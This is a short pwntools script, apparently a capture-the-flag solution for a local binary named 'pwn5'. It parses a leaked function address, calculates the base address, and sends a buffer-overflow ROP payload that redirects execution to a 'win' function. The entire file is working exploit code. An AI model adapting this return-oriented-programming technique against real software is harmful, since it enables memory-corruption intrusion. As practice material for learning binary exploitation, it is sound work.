from pwn import *

binary = "./pwn5"

r = process(binary)

e = ELF(binary)

leak = r.recvline().decode().split("leak? ")[1].split("\n")[0]
leak = int(leak, 16)
e.address = leak - e.symbols['win']
print(f"Leak: {hex(leak)}")
print(f"Base: {hex(e.address)}")
er = ROP(binary)
#er.address = e.address
pop_rdi_gadget = e.address + er.find_gadget(["pop rdi"])[0]
ret_gadget = e.address + er.find_gadget(["ret"])[0]
print(hex(pop_rdi_gadget))
print(hex(ret_gadget))
payload = flat("A"*32, "B"*8, p64(pop_rdi_gadget), p64(0xdeadbeef), p64(ret_gadget), p64(leak))

r.sendline(payload)
r.interactive()
